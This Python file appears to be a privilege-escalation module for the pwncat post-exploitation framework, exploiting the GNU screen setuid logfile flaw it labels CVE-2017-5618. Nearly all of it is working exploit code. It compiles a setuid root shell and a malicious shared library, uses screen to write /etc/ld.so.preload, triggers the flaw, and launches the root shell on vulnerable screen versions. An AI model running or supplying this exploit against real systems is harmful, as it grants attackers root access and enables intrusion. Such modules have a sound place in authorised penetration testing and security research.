#!/usr/bin/env python3
import re
import textwrap
from io import StringIO

import pwncat
from pwncat.gtfobins import Capability
from pwncat.modules.escalate import EscalateError, EscalateModule, Technique


class ScreenTechnique(Technique):
    """ Implements the actual escalation technique """

    def __init__(self, module, screen):
        super(ScreenTechnique, self).__init__(Capability.SHELL, "root", module)

        self.screen = screen

    def exec(self, binary: str):
        """ Run a binary as another user """

        # Write the rootshell source code
        rootshell_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                int main(void){{
                    setuid(0);
                    setgid(0);
                    seteuid(0);
                    setegid(0);
                    execvp("{binary}", NULL, NULL);
                }}
                """
        ).lstrip()

        # Compile the rootshell binary
        try:
            rootshell = pwncat.victim.compile([StringIO(rootshell_source)])
        except pwncat.util.CompilationError as exc:
            raise EscalateError(f"compilation failed: {exc}")

        rootshell_tamper = pwncat.tamper.created_file(rootshell)

        # Write the library
        libhack_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <sys/types.h>
                #include <unistd.h>
                __attribute__ ((__constructor__))
                void dropshell(void){{
                    chown("{rootshell}", 0, 0);
                    chmod("{rootshell}", 04755);
                    unlink("/etc/ld.so.preload");
                }}
                """
        ).lstrip()

        # Compile libhack
        try:
            libhack_so = pwncat.victim.compile(
                [StringIO(libhack_source)],
                cflags=["-fPIC", "-shared"],
                ldflags=["-ldl"],
            )
        except pwncat.util.CompilationError:
            pwncat.tamper.remove(rootshell_tamper)
            raise EscalateError("compilation failed: {exc}")

        # Switch to /etc but save our previous directory so we can return to it
        old_cwd = pwncat.victim.chdir("/etc")

        # Run screen with our library, saving the umask before changing it
        start_umask = pwncat.victim.run("umask").decode("utf-8").strip()
        pwncat.victim.run("umask 000")

        # Run screen, loading our library and causing our rootshell to be SUID
        pwncat.victim.run(
            f'{self.screen.path} -D -m -L ld.so.preload echo -ne "{libhack_so}"'
        )

        # Trigger the exploit
        pwncat.victim.run(f"{self.screen.path} -ls")

        # We no longer need the shared object
        pwncat.victim.env(["rm", "-f", libhack_so])

        # Reset umask to the saved value
        pwncat.victim.run(f"umask {start_umask}")

        # Check if the file is owned by root
        file_owner = pwncat.victim.run(f"stat -c%u {rootshell}").strip()
        if file_owner != b"0":

            # Hop back to the original directory
            pwncat.victim.chdir(old_cwd)

            # Ensure the files are removed
            pwncat.tamper.remove(rootshell_tamper)

            raise EscalateError("failed to create root shell")

        # Hop back to the original directory
        pwncat.victim.chdir(old_cwd)

        # Start the root shell!
        pwncat.victim.run(rootshell, wait=False)

        return "exit"


class Module(EscalateModule):
    """
    Utilize binaries marked SETUID to escalate to a different user.
    This module uses the GTFOBins library to generically locate
    payloads for binaries with excessive permissions.
    """

    PLATFORM = [pwncat.platform.linux.Linux]

    def enumerate(self):
        """ Enumerate SUID binaries """

        for fact in pwncat.modules.run(
            "enumerate.gather",
            progress=self.progress,
            types=["software.screen.version"],
        ):
            if fact.data.vulnerable and fact.data.perms & 0o4000:

                # Carve out the version of screen
                version_output = (
                    pwncat.victim.run(f"{fact.data.path} -v").decode("utf-8").strip()
                )
                match = re.search(r"(\d+\.\d+\.\d+)", version_output)
                if not match:
                    continue

                # We know the version of screen, check if it is vulnerable...
                version_triplet = [int(x) for x in match.group().split(".")]

                if version_triplet[0] > 4:
                    continue

                if version_triplet[0] == 4 and version_triplet[1] > 5:
                    continue

                if (
                    version_triplet[0] == 4
                    and version_triplet[1] == 5
                    and version_triplet[2] >= 1
                ):
                    continue

                yield ScreenTechnique(self, fact.data)

    def human_name(self, tech: ScreenTechnique):
        return f"[cyan]{tech.screen.path}[/cyan] (setuid [red]CVE-2017-5618[/red])"
